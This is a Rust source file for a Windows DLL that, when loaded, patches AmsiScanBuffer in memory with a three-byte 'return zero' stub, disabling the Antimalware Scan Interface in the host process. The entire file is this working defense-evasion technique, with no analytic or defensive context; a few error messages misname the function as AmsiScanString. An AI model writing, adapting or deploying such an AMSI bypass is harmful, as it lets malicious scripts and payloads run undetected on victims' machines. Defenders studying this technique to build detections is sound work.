use std::ffi::c_void;
use windows::core::{ s, w };
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::{ LoadLibraryW, GetProcAddress };
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Threading::{OpenProcess, GetCurrentProcess};
use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HMODULE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            attach();
        }
        DLL_PROCESS_DETACH => (),
        _ => (),
    }
    true
}

fn attach() {
    let result = unsafe { LoadLibraryW(w!("amsi.dll")) };
    if result.is_err() {
        println!("Failed to load 'amsi.dll'");
    }

    let farproc = unsafe { GetProcAddress(result.unwrap(), s!("AmsiScanBuffer")) };
    if farproc.is_none() {
        println!("Failed to get function address 'AmsiScanString'");
    }

    //println!("AmsiScanString address: {:?}", farproc.unwrap());

    let mut ppf = PAGE_PROTECTION_FLAGS(0);
    let r1 = unsafe { VirtualProtect(
            farproc.unwrap() as usize as *const c_void,
            3,
            PAGE_EXECUTE_READWRITE,
            &mut ppf as *mut PAGE_PROTECTION_FLAGS,
        )};
    if r1.is_err() {
        println!("Failed to modify protect flag");
    }

    //println!("farproc: {:?}", farproc.unwrap());

    let patch: [u8;3] = [0x33,0xc0,0xc3];
    let mut written_size: usize = 0;
    let re = unsafe {
        WriteProcessMemory(
            GetCurrentProcess(),
            farproc.unwrap() as *const c_void,
            patch.as_ptr() as *const c_void,
            3,
            Some(&mut written_size as *mut usize),
        )
    };

    if re.is_err() {
        println!("Failed to patch");
    }
    
    //println!("patch written: {} bytes", written_size); 
}
